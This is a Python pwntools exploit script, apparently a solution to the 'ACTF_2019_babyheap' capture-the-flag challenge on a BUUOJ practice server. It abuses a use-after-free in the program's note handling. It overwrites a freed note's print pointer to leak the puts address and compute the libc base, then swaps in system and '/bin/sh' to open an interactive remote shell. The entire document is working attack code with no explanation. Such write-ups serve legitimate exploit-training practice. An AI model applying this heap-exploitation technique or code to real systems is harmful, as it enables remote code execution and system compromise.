from pwn import *

#context.log_level = 'debug'

p = remote('node4.buuoj.cn', 28206)
#p = process('./ACTF_2019_babyheap')
elf = ELF('ACTF_2019_babyheap')
libc = ELF('libc-2.27.buu.so')

system_plt = elf.plt['system']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

def debug():
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''')

def alloc(size, content):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'size: \n', str(size).encode())
    p.sendafter(b'content: \n', content)

def delete(index):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'index: \n', str(index).encode())

def print(index):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'index: \n', str(index).encode())

alloc(0x20, b'a') #0
alloc(0x20, b'a') #1
delete(0)
delete(1)

alloc(0x10, p64(puts_got) + p64(puts_plt)) #2
print(0)

libc_base = u64(p.recv(6).ljust(8, b'\0')) - libc.sym['puts']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

success('libc_base -> {}'.format(hex(libc_base)))

delete(2)
alloc(0x10, p64(bin_sh) + p64(system_plt)) #3

print(0)

p.interactive()